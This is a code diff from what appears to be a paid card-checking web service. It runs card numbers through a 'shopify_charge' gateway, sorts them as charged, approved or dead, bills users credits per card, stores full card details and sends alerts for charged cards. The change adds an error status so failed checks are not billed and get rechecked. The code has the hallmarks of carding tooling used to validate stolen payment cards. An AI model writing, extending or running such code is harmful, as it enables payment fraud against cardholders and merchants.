@@ -6440,29 +6440,32 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
              mtxtCheckCard(cardCC)
            ]);
 
-           let statusType: string;
-           const respLower = (result.response || '').toLowerCase();
-           if (result.status === 'live') {
-             if (respLower.includes('order_completed') || respLower.includes('order completed')) { mtxtCharged++; statusType = 'live'; }
-             else { mtxtApproved++; statusType = 'approved'; }
-           } else if (result.status === 'dead') {
-             mtxtDeclined++; statusType = 'dead';
-           } else {
-             if (respLower.includes('3ds') || respLower.includes('otp') || respLower.includes('required')) { mtxtApproved++; statusType = 'approved'; }
-             else { mtxtDeclined++; statusType = 'dead'; }
-           }
+            let statusType: string;
+            const respLower = (result.response || '').toLowerCase();
+            if (result.status === 'live') {
+              if (respLower.includes('order_completed') || respLower.includes('order completed')) { mtxtCharged++; statusType = 'live'; }
+              else { mtxtApproved++; statusType = 'approved'; }
+            } else if (result.status === 'dead') {
+              mtxtDeclined++; statusType = 'dead';
+            } else if (result.status === 'error') {
+              mtxtErrorCount++; statusType = 'error';
+              mtxtErrorCards.push(cardCC);
+            } else {
+              if (respLower.includes('3ds') || respLower.includes('otp') || respLower.includes('required')) { mtxtApproved++; statusType = 'approved'; }
+              else { mtxtErrorCount++; statusType = 'error'; mtxtErrorCards.push(cardCC); }
+            }
 
-           let cardCost = 0;
-           if (result.status === 'live') cardCost = 2;
-           else if (result.status === 'dead') cardCost = 1;
-           mtxtTotalCost += cardCost;
+            let cardCost = 0;
+            if (result.status === 'live') cardCost = 2;
+            else if (result.status === 'dead') cardCost = 1;
+            // No cost for error cards
+            mtxtTotalCost += cardCost;
 
-           if (cardCost > 0) {
-             await supabase.from("profiles").update({ credits: mtxtProfile.credits - mtxtTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mtxtProfile.user_id);
-             await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: result.status === "live" ? "charged" : "dead" });
-           } else {
-             await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: "unknown" });
-           }
+            if (result.status === 'live' || result.status === 'dead') {
+              await supabase.from("profiles").update({ credits: mtxtProfile.credits - mtxtTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mtxtProfile.user_id);
+              await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: result.status === "live" ? "charged" : "dead" });
+            }
+            // Don't insert error cards into card_checks - they'll be rechecked
 
            if (result.status === 'live' && SUPABASE_SERVICE_ROLE_KEY) {
              fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
